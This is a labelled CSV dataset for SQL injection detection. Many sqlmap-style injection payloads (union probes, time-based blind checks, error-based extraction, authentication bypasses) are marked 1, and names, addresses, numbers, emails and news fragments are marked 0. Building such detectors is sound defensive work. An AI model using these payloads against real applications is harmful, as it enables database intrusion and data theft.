Sentence,Label
homs breither,0
" &quot; The local authorities satisfied , &quot; emphasised Maier ",0
"c/ balmes, 66,",0
"torremacana, 107 7e",0
frontado victory,0
"1""  )  )   union all select null,null,null,null,null#",1
"muela, la",0
"1  )  )   or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
" According police , autopsy showed evidence capital offence ",0
8632,0
olid seuba,0
1223521743723131,0
"1""  )  )   as etap where 8506 = 8506 union all select null,null,null,null#",1
tomkin,0
"1 or elt ( 6272 = 6272,sleep ( 5  )  )  # klaw",1
desplacib-le,0
 With opinion least alone State Capital ,0
"-6073""  )  )   )  or 9502 = 2012#",1
1538,0
"1%'  )  )   or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
coyne-rabasa@intercambioenlaces.do,0
"1%""  )  )   or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
21388,0
"c/ ereta, 104,",0
castrillo de la valduerna,0
segart,0
colunga corrius,0
tiramollar,0
0883673418976752,0
859,0
" The cause blast known , said ",0
patrica0,0
 end and   (  (  'zlsq' = 'zlsq,1
giridhar,0
" Mr Cook said: &quot; Following increases stamp duty high value homes introduction associated anti-avoidance legislation , difficult argue high value property under-taxed irrespective effect out-dated council tax system ",0
2187090627457981,0
"1"" )  where 4588 = 4588",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
1'+ ( select idnb where 2338 = 2338,1
31414,0
"-5972"" or 8509 = 3448#",1
"1"" )  as tecq where 4817 = 4817 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
2784102428679593,0
maula,0
trasabuela,0
" This year , sexy inanimate objects rage ",0
foote@tecnoindomo.ad,0
2935,0
"-4828'+ ( select qxnw where 9488 = 9488 union all select 9488,9488--",1
1' and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and 'ukzb' = 'ukzb,1
"1""  )  )   )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (   ( ""whld"" = ""whld",1
" Unfortunately , event unfavourable wind , heard far away - result already number complaints people north town ",0
f9g10062,0
marsh@comerciosaspe.ke,0
17867,0
acopetado,0
"-9553"" )  as geih where 6453 = 6453 or 8453 = 8159--",1
"-6158"" )  union all select 3084,3084,3084,3084,3084,3084#",1
9a26re88,0
"select benchmark ( 5000000,md5 ( 0x714e4153  )  )  #",1
" In documentation leaked Mr Snowden , , however , evidence date US passed foreign companies &apos; trade secrets companies ",0
guino osarte,0
"-8783'  )  )   union all select 4834,4834,4834,4834,4834,4834,4834,4834,4834--",1
34196882e,0
1' )  as mpsf where 3348 = 3348,1
campuzano bedoya,0
kurt,0
dud,0
"1"" or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) ",1
 The Sheffield group scheduled perform Hydro venue city Friday ,0
"1' where 4039 = 4039 union all select null,null,null,null,null,null,null,null--",1
"1'+ ( select 'wkcq' where 1020 = 1020 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
"1%""  )  )   and 7358 = 6986--",1
alba2igo,0
pinela,0
06001,0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and  ( ""%"" = """,1
" With larger instruments , astronomers could map planets similar Earth even analyse composition atmospheres , thus search &quot; biomarkers &quot;: gases serve indicator biological activity ",0
"1 )  and make_set ( 4593 = 7765,7765 )  and  ( 8517 = 8517",1
" select * from users where id = '1' or $<\. union select 1,@@VERSION -- 1'",1
rigaud@arroyo-molinos.an,0
7as72110,0
englert,0
9061531800144737,0
03307827j,0
 Morsi &apos;s speech Tahrir Square filled dramatic populist gestures ,0
"c/ fuente 28,",0
" The soul always hears admonition lines, let subject may",0
buehlmann.mcdonall@qcole.sn,0
1 )  as ryks where 1196 = 1196,1
3413347210986966,0
"1"" )  as pxdq where 2236 = 2236 and 2006 = 2006",1
"1'  )  )   )  procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
zarzuela,0
" select * from users where id = '1' union select \.#,@@VERSION -- 1'",1
adelantamiento,0
"1'  )  )   )  and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
0552871486458535,0
milionario.kirkham@programa-gestion-erp.mil,0
"select * from generate_series ( 4975,4975,case when  ( 4975 = 9615 )  then 1 else 0 end )  limit 1--",1
 The tunnel eighth major passage discovered San Diego since 2006 ,0
fregaci5n,0
9786890057742572,0
albornoz quiva,0
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  (  'btnl' = 'btnl",1
javiera,0
4or6un0,0
valdecuenca,0
" At beginning September , elite field European space research met Paris discuss proposals missions ",0
51518357j,0
1o11lo6,0
elsie,0
penningt,0
6,0
matungo,0
"1  )  )   or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
escat monistca,0
"-6760 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) # ikqw",1
55540530s,0
chamberlain@muevemiweb.al,0
" Brazil &apos;s Embraer SA , world &apos;s third-largest commercial planemaker Bombardier &apos;s closest rival , reported 10 percent fall quarterly profit Thursday ",0
"-1483' or make_set ( 9354 = 9354,7185 )  and 'qfil' = 'qfil",1
"1 )  where 5336 = 5336 union all select null,null,null,null,null,null,null,null,null,null#",1
16620,0
juradera,0
rigby,0
"1"" )  where 3679 = 3679",1
31587,0
6460,0
"praza san antonio da florida, 27,",0
coraline,0
hedda,0
"cabaeros, 131",0
18212,0
"-3368'  )  )   union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",1
latas,0
 &quot; There radical extremism world hell-bent determined try kill people blow people attack governments ,0
"1"" )  where 2602 = 2602 and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
agero,0
"1  )  )   as dhge where 4816 = 4816 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
strock,0
colote,0
14638777j,0
"1'|| ( select 'vixv' from dual where 7704 = 7704 union all select null,null,null,null,null--",1
jade,0
"1  )  )   and make_set ( 8403 = 8403,8899 )  and   (  (  4686 = 4686",1
vimbre,0
40176,0
' or 1 = 1-- ,1
sarfati@weat.nc,0
8578,0
"-7601""  )  )   )  union all select 1293,1293,1293,1293,1293,1293,1293,1293--",1
"-7686%"" )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
"1%'  )  )   or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (  '%' = '",1
"-4408"" )  or 6872 = 6872 and  ( ""oenu"" = ""oenu",1
1%'  )  )   )  rlike sleep ( 5 ) #,1
brocatel,0
"-4155'  )  )   )  union all select 1775,1775,1775,1775,1775,1775,1775--",1
susinos del pramo,0
teulada,0
palmer manzano,0
69301315s,0
786,0
"select * from generate_series ( 5980,5980,case when  ( 5980 = 5063 )  then 1 else 0 end )  limit 1--",1
 Let words gazetted ridiculous henceforward,0
intxaurraga,0
milsima,0
" Rockstar , consortium bought Nortel patents $ 4",0
simhan,0
89208475p,0
aguinaga achutegui,0
mcbrayne,0
"-5539"" )  union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",1
$vastedad,0
vetrie,0
"1 )  and elt ( 7425 = 8842,8842 )  and  ( 9194 = 9194",1
millian@intelethernet.cc,0
 end#,1
" That person receive $ 250,000 continue extraordinary work ",0
quintanilla de urz,0
8965,0
"-8098%' )  union all select 5697,5697,5697,5697,5697,5697,5697,5697,5697,5697#",1
puges crcamo,0
"-7485""  )  )   as caob where 4100 = 4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",1
select  ( case when  ( 1005 = 5996 )  then 1 else 1005* ( select 1005 from master..sysdatabases )  end ) --,1
"1 )  and elt ( 4249 = 4249,7259 ) ",1
"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",1
caiza,0
34305,0
" &quot; They beating drums night keep us awake continue work , &quot; Bwelle said ",0
4124162736834322,0
"calle republique dominicana, 85",0
46725,0
"-5911 union all select 2245,2245,2245,2245,2245,2245#",1
"-4477'  )  )   union all select 8444,8444,8444,8444,8444,8444,8444,8444--",1
1 )  where 8375 = 8375,1
reluchar,0
yueh.frasco@granbretana.com.hk,0
"1 )  where 2044 = 2044 or elt ( 6272 = 6272,sleep ( 5  )  )  --",1
burstein@g-audio.ee,0
09352334m,0
pealver palenzuela,0
 Previous talks parties done little ease tensions fuelled series clashes year ,0
"1"" )  as cfed where 8220 = 8220 union all select null,null,null,null,null,null,null,null,null#",1
prada@mundoradiocontrol.zm,0
"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and 'hzav' = 'hzav",1
tornos,0
' or ''-',1
gu5cima,0
camita,0
pavorde,0
31588,0
"plza. carmelo solis, 78, 4?g",0
cercedilla,0
humaina,0
1'|| ( select 'kzkr' from dual where 2778 = 2778,1
04510,0
" Currently , passengers required turn smartphones , tablets devices plane &apos;s door closes ",0
-6327'  )  )   union all select 2685--,1
thomasia,0
 But went way beyond ordinary confines lawyer-client relationship ,0
00916150z,0
"1 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
tarragona,0
c/ costa i llobera 83,0
lilien@aprendeaestudiar.lt,0
"-2149""  )  )   )  or elt ( 1032 = 1032,3623 )  and   (  (   ( ""hoon"" like ""hoon",1
" &quot; This slow pace flight testing - although line Bombardier &apos;s internal schedule apparently - reinforces view entry-into-service pushed Q1 / 15 , &quot; said Doerksen ",0
oesterlein@connect.pw,0
"1%"" )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( ""%"" = """,1
"1"" where 6352 = 6352",1
"1'  )  )   )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 'zoxm' like 'zoxm",1
vallclara,0
wolbert.navin@cirugiaalbeiteria.nu,0
hartford,0
nahir,0
"c/ madrid, 53 5-f",0
"1%'  )  )   )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( '%' = '",1
saturnina,0
"-9856"" union all select 9753--",1
79p2lis25,0
bullicioso,0
hetera,0
"-5738"" )  as efbn where 8541 = 8541 union all select 8541,8541,8541,8541,8541,8541,8541,8541#",1
1466,0
"1 )  where 4698 = 4698 and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
muogalindo,0
select  ( case when  ( 4994 = 1572 )  then 4994 else 4994* ( select 4994 from mysql.db )  end ) #,1
-3752,1
"1' and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ",1
ailee1,0
select  ( case when  ( 4755 = 4784 )  then 1 else 4755* ( select 4755 from master..sysdatabases )  end ) --,1
 The presenter established one thing right outset: The important thing comes ham legs pork - turbo fattening provide good basis ,0
calle estafeta 105 6c,0
rini,0
"1%' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and '%' = '",1
maybelle9,0
"1%'  )  )   )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( '%' = '",1
-4562' )  or 3038 = 3038,1
fiallos,0
7110252413473830,0
salmern grenett,0
"1%' or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and '%' = '",1
abaeto sanchon,0
galina,0
" select * from users where id = 1 +  ( \+ )  union select null,@@VERSION -- 1",1
"-3228"" )  or  ( 5901 = 1570 ) *1570 and  ( ""egdd"" = ""egdd",1
1'+ ( select hrgu where 9587 = 9587,1
"1"" union all select null,null,null--",1
"-9509 )  union all select 1193,1193,1193#",1
p5r0i9i5ar,0
1 where 2956 = 2956,1
1  )  )   as gxvp where 3865 = 3865,1
1'  )  )   as zari where 6847 = 6847,1
7686271480294625,0
"1'  )  )   )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (   ( 'xwhi' = 'xwhi",1
"-8013%"" or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and ""%"" = """,1
3891909303541723,0
7828706714204414,0
46369,0
1'  )  )   and 7230 = 2517,1
28rt27r1,0
43823011f,0
c6ch3n,0
"1' where 6721 = 6721 union all select null,null,null,null,null,null,null,null,null,null#",1
" Yet , examples I listed , largely seem administration &apos;s choosing ",0
select case when 5559 = 3483 then 1 else null end--,1
bayarri bach,0
jesusa,0
demias,0
mariele,0
rayen,0
"1', ( case when 8260 = 8260 then 1 else null end ) ",1
"-8709"" or 8571 = 8571--",1
manuel pereira s/n 12?a,0
larixa,0
"c/ las chumberas, 38,",0
ripley_kapianidze@reidesa.net,0
domich cajahuanca,0
3547056406235223,0
" Mr Alderson , Keighley , added: &quot; We scared might fall stayed ",0
09227,0
5i13r,0
argamasilla de alba,0
" In addition holding weekend clinics working hospital surgeon , Bwelle also works nights private medical clinics around Yaounde ",0
"1"" )  rlike sleep ( 5 ) #",1
1 where 8966 = 8966,1
"-4031%"" union all select 9566--",1
"1"" and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and ""mezx"" like ""mezx",1
rosoli,0
2630,0
1 million barrels last week ,0
gancedo,0
1' )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  ,1
monzons cambeiro,0
23611263s,0
29p0r2en9e7c87,0
6194,0
26288,0
"1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and 'nelb' = 'nelb",1
"1 )  as bgvd where 1753 = 1753 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
charpini_daillie@inmobiliariahangar.ly,0
' or 'x' = 'x,1
03786,0
sikander,0
1'+ ( select biqo where 6046 = 6046,1
4ip7237o8h2dira,0
42855301e,0
"1' and elt ( 4249 = 4249,7259 )  and 'awjd' = 'awjd",1
fernn caballero,0
vila-sana,0
' select name from syscolumns where id  =   ( select id from sysobjects where name  =  tablename' ) --,1
1'|| ( select 'sbft' where 8748 = 8748,1
"1%'  )  )   )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( '%' = '",1
"calle reina violante, 35,",0
0891410815966655,0
ocallaghan@asyra.li,0
martinn sampayo,0
847,0
sinatra@cementoscalibra.mil,0
83607535m,0
"-6629%""  )  )   )  or 8571 = 8571--",1
"select count ( * )  from generate_series ( 1,5000000 )  and  ( 'tnvm' like 'tnvm",1
se5ap62o,0
valle de yerri/deierri,0
"1"" )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and  ( ""azpb"" = ""azpb",1
"1' or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
tr871lat5cia,0
"-5143'+ ( select 'zyrr' where 8405 = 8405 union all select 8405,8405,8405,8405#",1
"cayetano polo ""polito"" 90 2?a",0
ji-chuu,0
 Surgery rendered infertile ,0
1' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  ,1
" During presentation , Wolf seemed impressed educational pilot project ",0
"1""  )  )   as eagr where 3366 = 3366 and elt ( 4249 = 4249,7259 ) --",1
Ã½ or 1 = 1 --,1
arrazua-ubarrundia,0
6913071576619939,0
pampanas soto,0
admin'/*,1
ax,0
" &quot; These remnants Roman city wall , built second half first century A",0
-3998'  )  )   or 3038 = 3038,1
calle cantos negros 150,0
1' )  and  ( 3020 = 3020 ) *6703 and  ( 'lhfa' = 'lhfa,1
"fernando poo 23, 8?f",0
 The Haigerloch Town Tourist Office available questions provide information ,0
fabres jordi,0
krautle,0
eddier,0
eduviges,0
smithdea,0
37110,0
7855531412363120,0
"1' )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and  ( 'mevd' = 'mevd",1
19807221n,0
banyeres del peneds,0
-2715'  )  )   or 6942 = 1636 and   (  (  'mqeq' = 'mqeq,1
aras de los olmos,0
karla,0
" &quot; There lot tears year , &quot; Ms Corteen said ",0
1 )  as cinw where 3732 = 3732 and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --,1
"1"" )  and elt ( 4249 = 4249,7259 )  and  ( ""xgka"" like ""xgka",1
" select * from users where id = 1 or 1#""$ union select 'a',version (  )  -- 1",1
clooney,0
 A post-doctoral lecturing qualification fundamental theology ecumenical theology followed 2003 Westfalian Wilhelm &apos;s University ,0
alvis,0
"5 metres , time possible unload Capesize bulk carriers ",0
beneit pao,0
santibez el bajo,0
lyston@classroommanager.co,0
1' )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and  ( 'fupe' = 'fupe,1
seda,0
-3243 or 2266 = 3583#,1
1165,0
adolphe,0
"1' )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and  ( 'ajkb' = 'ajkb",1
31281,0
"1"" union all select null,null--",1
" select * from users where id = 1 | |1 union select 1,banner from v$version where rownum = 1 -- 1",1
"-8612' )  as toeu where 6357 = 6357 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1
"1%'  )  )   union all select null,null,null,null,null,null--",1
68m+b11n,0
"calle suceso terrero 68, 7a",0
brihuega uslet,0
1541444021319279,0
"-1079"" )  where 2865 = 2865 union all select 2865,2865,2865,2865,2865,2865,2865,2865,2865#",1
"1 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ",1
"1""  )  )   as ngvf where 9912 = 9912 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
mico puig,0
"1'+ ( select ounb where 4653 = 4653 or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   ) +'",1
novau pola,0
-3597'  )  )   order by 1--,1
marketa,0
fincias alcoriza,0
"losilla, la",0
"1%"" )  union all select null,null,null,null,null,null--",1
ope267s4ic4,0
"1"" or sleep ( 5 ) #",1
tudanca,0
"calle maldonadas, s/n 4h",0
c632i6ela,0
55z8do,0
hayashi@librodeapuntes.tc,0
-1188  )  )   union all select 4711--,1
moharra jodra,0
3929,0
" They &apos;re supposed restart planes reach 10,000 feet captain gives go-ahead ",0
"-8869"" where 3019 = 3019 union all select 3019,3019,3019#",1
vallabri visglerio,0
"1""  )  )   as klie where 2840 = 2840 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
1 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  ,1
"1' )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 ) ",1
c/ tajonar 93 2e,0
"1"" )  or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and  ( ""nnmz"" like ""nnmz",1
11901410z,0
"1 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 ) ",1
"1""  )  )   )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (   ( ""zzcd"" = ""zzcd",1
1' and sleep ( 5 ) ,1
5257931647701652,0
9302322356246829,0
pico despuig,0
"1'+ ( select 'drvv' where 5622 = 5622 and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
mathieu,0
"1"" )  where 8612 = 8612",1
17539,0
1 )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( 3530 = 3530,1
"1%"" union all select null,null,null,null,null,null#",1
8911,0
merrywea,0
 New York City psychiatrist Dr,0
indamira,0
blauer,0
" Soya , oat , almond rice milk used place milk ",0
4279654044611256,0
3658503055705186,0
psklib,0
wynnie,0
 Gallen Monastery ,0
"select * from generate_series ( 9434,9434,case when  ( 9434 = 3991 )  then 1 else 0 end )  limit 1--",1
18684547z,0
porel@xslive.sd,0
"1"" )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and  ( ""qkds"" like ""qkds",1
"primavera, 174",0
"-1907""  )  )   or 2782 = 3591",1
anunciador,0
7225214328670824,0
1 where 4844 = 4844,1
verani@viajesdacapalla.gq,0
" If , Khan said , public gets comfortable ",0
"1'  )  )   or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (  'holo' = 'holo",1
81208495a,0
 ( sqlvuln ) ,1
"1"" )  where 1614 = 1614 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  --",1
1' in boolean mode )  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) #,1
"1' where 7417 = 7417 and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
"1' where 2774 = 2774 union all select null,null,null,null,null#",1
"1'|| ( select 'hrpa' where 1973 = 1973 union all select null,null,null,null,null,null,null,null,null--",1
" Also Thursday , Syrian activist group said 120,000 people killed since start country &apos;s civil war nearly three years ago ",0
0505974990919902,0
" Andrew Howie , 35 , Tiptree , Essex , spotted driving Mercedes Benz A120 Braintree 27 May ",0
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and  ( 9481 = 9481",1
 Charlie Francis harnessed fluorescent properties marine animal develop luminescent snack ,0
cl5m9,0
goman@fbi-criminal-network.com.mh,0
patterso,0
kalil,0
 The traditional children &apos;s dance group Gutach also performing 11: 30 a,0
mo3tren04,0
" This comes time possible shortage ministers: The Protestant Lutheran Regional Church Hanover calculates , things stand , current number around 1,800 pastors halved 2030 ",0
21236992b,0
fierro@porqueagel.je,0
1  )  )   or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (  7805 = 7805,1
"-9140""  )  )   union all select 1623,1623,1623,1623,1623,1623,1623,1623,1623#",1
guardiola puertolas,0
crdoba,0
sappington-espana@fighting-machines.mq,0
"-9133""  )  )   or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  ""crfy"" = ""crfy",1
flicking,0
dottin,0
ns,1
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and   (  (   ( ""mofa"" like ""mofa",1
neugebauer@buscamoto.gw,0
1' or sleep ( 5 )  and 'yudo' = 'yudo,1
16362236j,0
select  ( case when  ( 3681 = 5989 )  then 3681 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
08691,0
5818,0
cinca toscano,0
5561938510666442,0
gueslaz,0
"1' in boolean mode )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 ) #",1
" Police chief David Kimaiyo reacted summoning two journalists media executive questioning , although summons retracted following media outcry ",0
felipe olvera s/n 4?g,0
5389852449679105,0
"1'  )  )   or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and   (  (  'wbsz' = 'wbsz",1
ambas,0
gunner@piaceredelivery.kw,0
monasterio,0
